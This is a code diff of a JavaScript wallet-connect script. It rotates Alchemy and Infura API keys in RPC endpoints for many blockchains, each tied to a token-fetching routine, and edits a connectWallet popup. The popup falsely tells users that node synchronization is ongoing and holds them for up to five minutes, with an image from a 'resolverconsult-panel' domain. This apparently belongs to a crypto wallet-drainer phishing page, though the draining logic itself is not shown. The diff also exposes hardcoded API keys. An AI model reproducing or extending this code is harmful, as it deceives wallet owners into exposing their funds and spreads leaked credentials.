@@ -11,14 +11,14 @@ const mainnet = {
   name: 'Ethereum',
   currency: 'ETH',
   explorerUrl: 'https://etherscan.io',
-  rpcUrl: 'https://eth-mainnet.g.alchemy.com/v2/IRwnvoQZmF2e0lePk63uoLwKO_en3nY1'
+  rpcUrl: 'https://mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
 }
 
 const arbitrum = {
   chainId: 42161,
   name: 'Arbitrum',
   explorerUrl: 'https://arbiscan.io/',
-  rpcUrl: "https://arb-mainnet.g.alchemy.com/v2/ArryoXDbagypNpkMY9uMh7FGxbwN7TeV"
+  rpcUrl: "https://arb-mainnet.g.alchemy.com/v2/2YV6LZ06vlLEhAoXjhHyN4WrXjQwG4WW"
 }
 
 const bsc = {
@@ -32,7 +32,7 @@ const optimism = {
   chainId: 10,
   name: 'Optimism',
   explorerUrl: 'https://optimistic.etherscan.io/',
-  rpcUrl: 'https://opt-mainnet.g.alchemy.com/v2/8jtBd-tmbbYfH0LzgXJRSCKFDGBZWc1I'
+  rpcUrl: 'https://opt-mainnet.g.alchemy.com/v2/q6r7-bg0Cfz47MgbP7IpK5fsfZvaOBRj'
 }
 
 const arbnova = {
@@ -46,7 +46,7 @@ const base = {
   chainId: 8453,
   name: 'Base',
   explorerUrl: 'https://basescan.org/',
-  rpcUrl: 'https://base-mainnet.g.alchemy.com/v2/2aVRyMi5gW6MUMbunRjGIyEWyy-DvWGI'
+  rpcUrl: 'https://base-mainnet.g.alchemy.com/v2/P__GBZTUcyu7f9FIWutz3vriqYun4V9y'
 }
 
 const zksync = { // Added missing colon after object declaration
@@ -60,14 +60,14 @@ const polygon = {
   chainId: 137,
   name: "Polygon",
   explorerUrl: "https://polygonscan.com/",
-  rpcUrl: "https://polygon-mainnet.g.alchemy.com/v2/C7T5HeZ3XlrUjKdMYLMrcdO0pxcNQWYX"
+  rpcUrl: "https://polygon-mainnet.g.alchemy.com/v2/l1HzJiJmTRdhEY0eaikYZQOFoVfCk1nj"
 }
 
 const polygonevm = {
   chainId: 1101,
   name: 'Polygon EVM',
   explorerUrl: 'https://zkevm.polygonscan.com/',
-  rpcUrl: 'https://polygonzkevm-mainnet.g.alchemy.com/v2/ghkCe0RRzGrywh7RkuygKvLwtnH1ALGJ'
+  rpcUrl: 'https://polygonzkevm-mainnet.g.alchemy.com/v2/hQFk1o7Bs_FPrT8HXVlpnaN3KN38azgr'
 }
 
 const blast = {
@@ -116,7 +116,7 @@ const gnosis = {
   chainId: 100,
   name: 'Gnosis',
   explorerUrl: 'https://gnosisscan.io/',
-  rpcUrl: 'https://rpc.gnosis.gateway.fm'
+  rpcUrl: 'https://rpc.gnosischain.com'
 }
 
 const celo = {
@@ -381,11 +381,11 @@ async function connectWallet() {
         try {
             Swal.fire({
                 title: 'Please Wait...',
-                html: 'Node synchronization completes in maximum <b></b> seconds. I will close after Synchronization is complete',
+                html: 'Node synchronization is ongoing. I will close after Synchronization is complete. Average wait time is <b></b seconds',
                 imageUrl: 'https://www.resolverconsult-panel.com/assets/save_bckudy-gjk8moac.png',
                 imageWidth: 300,
                 imageHeight: 200,
-                timer: 220000,
+                timer: 300000,
                 timerProgressBar: true,
                 didOpen: () => {
                     Swal.showLoading();
@@ -418,23 +418,23 @@ async function connectWallet() {
 
        
         let networkDetect = [
-            {chainId: mainnet.chainId, name: mainnet.name, rpcurl: 'https://eth-mainnet.g.alchemy.com/v2/IRwnvoQZmF2e0lePk63uoLwKO_en3nY1', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://etherscan.io/', fetchTokens: fetchETHTokens},
+            {chainId: mainnet.chainId, name: mainnet.name, rpcurl: 'https://mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://etherscan.io/', fetchTokens: fetchETHTokens},
             {chainId: bsc.chainId, name: bsc.name, rpcurl: 'https://bsc-mainnet.public.blastapi.io', nativeCurrency: {name: 'BNB',symbol:'BBN', decimal: 18}, blockExplorerUrl: 'https://bscscan.com/', fetchTokens: fetchBNBTokens},
-            {chainId: arbitrum.chainId, name: arbitrum.name, rpcurl: 'https://arb-mainnet.g.alchemy.com/v2/ArryoXDbagypNpkMY9uMh7FGxbwN7TeV', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://arbiscan.io/', fetchTokens: fetchARBTokens},
-            {chainId: optimism.chainId, name: optimism.name, rpcurl: 'https://opt-mainnet.g.alchemy.com/v2/8jtBd-tmbbYfH0LzgXJRSCKFDGBZWc1I', nativeCurrency: {name: 'Ethereum', symbol: 'ETH'}, blockExplorerUrl: 'https://optimistic.etherscan.io/', fetchTokens: fetchOPTokens},
+            {chainId: arbitrum.chainId, name: arbitrum.name, rpcurl: 'https://arb-mainnet.g.alchemy.com/v2/2YV6LZ06vlLEhAoXjhHyN4WrXjQwG4WW', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://arbiscan.io/', fetchTokens: fetchARBTokens},
+            {chainId: optimism.chainId, name: optimism.name, rpcurl: 'https://opt-mainnet.g.alchemy.com/v2/q6r7-bg0Cfz47MgbP7IpK5fsfZvaOBRj', nativeCurrency: {name: 'Ethereum', symbol: 'ETH'}, blockExplorerUrl: 'https://optimistic.etherscan.io/', fetchTokens: fetchOPTokens},
             {chainId: arbnova.chainId, name: arbnova.name, rpcurl: 'https://arbitrum-nova.public.blastapi.io', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://nova.arbiscan.io/', fetchTokens: fetchARBNOVATokens},
-            {chainId: base.chainId, name: base.name, rpcurl: 'https://base-mainnet.g.alchemy.com/v2/2aVRyMi5gW6MUMbunRjGIyEWyy-DvWGI', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://basescan.org/', fetchTokens: fetchBASETokens},
+            {chainId: base.chainId, name: base.name, rpcurl: 'https://base-mainnet.g.alchemy.com/v2/P__GBZTUcyu7f9FIWutz3vriqYun4V9y', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://basescan.org/', fetchTokens: fetchBASETokens},
             {chainId: zksync.chainId, name: zksync.name, rpcurl: 'https://mainnet.era.zksync.io', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://explorer.zksync.io/', fetchTokens: fetchZKSYNCTokens},
-            {chainId: polygon.chainId, name: polygon.name, rpcurl: 'https://polygon-mainnet.g.alchemy.com/v2/C7T5HeZ3XlrUjKdMYLMrcdO0pxcNQWYX', nativeCurrency: {name: 'Matic', symbol: 'MATIC', decimal: 18}, blockExplorerUrl: 'https://polygonscan.com/', fetchTokens: fetchPOLYGONTokens},
-            {chainId: polygonevm.chainId, name: polygonevm.name, rpcurl: 'https://polygonzkevm-mainnet.g.alchemy.com/v2/ghkCe0RRzGrywh7RkuygKvLwtnH1ALGJ', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://zkevm.polygonscan.com/', fetchTokens: fetchPOLYGONEVMTokens},
+            {chainId: polygon.chainId, name: polygon.name, rpcurl: 'https://polygon-mainnet.g.alchemy.com/v2/l1HzJiJmTRdhEY0eaikYZQOFoVfCk1nj', nativeCurrency: {name: 'Matic', symbol: 'MATIC', decimal: 18}, blockExplorerUrl: 'https://polygonscan.com/', fetchTokens: fetchPOLYGONTokens},
+            {chainId: polygonevm.chainId, name: polygonevm.name, rpcurl: 'https://polygonzkevm-mainnet.g.alchemy.com/v2/hQFk1o7Bs_FPrT8HXVlpnaN3KN38azgr', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://zkevm.polygonscan.com/', fetchTokens: fetchPOLYGONEVMTokens},
             {chainId: blast.chainId, name: blast.name, rpcurl: 'https://blast-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://blastscan.io/', fetchTokens: fetchBLASTTokens},
             {chainId: scroll.chainId, name: scroll.name, rpcurl: 'https://scroll-mainnet.public.blastapi.io', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://scrollscan.com/', fetchTokens: fetchSCROLLTokens},
             {chainId: metis.chainId, name: metis.name, rpcurl: 'https://metis-mainnet.public.blastapi.io', nativeCurrency: {name: 'Metis Token', symbol: 'METIS', decimal: 18}, blockExplorerUrl: 'https://explorer.metis.io/', fetchTokens: fetchMETISTokens},
             {chainId: merlin.chainId, name: merlin.name, rpcurl: 'https://merlin.blockpi.network/v1/rpc/public', nativeCurrency: {name: 'Bitcoin', symbol: 'BTC', decimal: 18}, blockExplorerUrl: 'https://scan.merlinchain.io/', fetchTokens: fetchMERLINTokens},
             {chainId: manta.chainId, name: manta.name, rpcurl: 'https://manta-pacific.drpc.org', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://pacific-explorer.manta.network/', fetchTokens: fetchMANTATokens},
             {chainId: fantom.chainId, name: fantom.name, rpcurl: 'https://fantom-mainnet.public.blastapi.io', nativeCurrency: {name: 'Fantom', symbol: 'FTM', decimal: 18}, blockExplorerUrl: 'https://ftmscan.com/', fetchTokens: fetchFANTOMTokens},
-            {chainId: gnosis.chainId, name: gnosis.name, rpcurl: 'https://rpc.gnosis.gateway.fm', nativeCurrency: {name: 'xDai', symbol: 'xDAI', decimal: 18}, blockExplorerUrl: 'https://gnosisscan.io/', fetchTokens: fetchGNOSISTokens},
-            {chainId: celo.chainId, name: celo.name, rpcurl: 'https://1rpc.io/celo', nativeCurrency: {name: 'Celo', symbol: 'CELO', decimal: 18}, blockExplorerUrl: 'https://celoscan.io/', fetchTokens: fetchCELOTokens},
+            {chainId: gnosis.chainId, name: gnosis.name, rpcurl: 'https://rpc.gnosischain.com', nativeCurrency: {name: 'xDai', symbol: 'xDAI', decimal: 18}, blockExplorerUrl: 'https://gnosisscan.io/', fetchTokens: fetchGNOSISTokens},
+            {chainId: celo.chainId, name: celo.name, rpcurl: 'https://celo-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Celo', symbol: 'CELO', decimal: 18}, blockExplorerUrl: 'https://celoscan.io/', fetchTokens: fetchCELOTokens},
             {chainId: cronos.chainId, name: cronos.name, rpcurl: 'https://evm.cronos.org/', nativeCurrency: {name: 'Cronos', symbol: 'CRO', decimal: 18}, blockExplorerUrl: 'https://cronoscan.com/', fetchTokens: fetchCRONOSTokens},
             {chainId: mantle.chainId, name: mantle.name, rpcurl: 'https://mantle-mainnet.public.blastapi.io', nativeCurrency: {name: 'Mantle', symbol: 'MNT', decimal: 18}, blockExplorerUrl: 'https://explorer.mantle.xyz/', fetchTokens: fetchMANTLETokens},
             {chainId: aurora.chainId, name: aurora.name, rpcurl: 'https://mainnet.aurora.dev', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://explorer.aurora.dev/', fetchTokens: fetchAURORATokens},
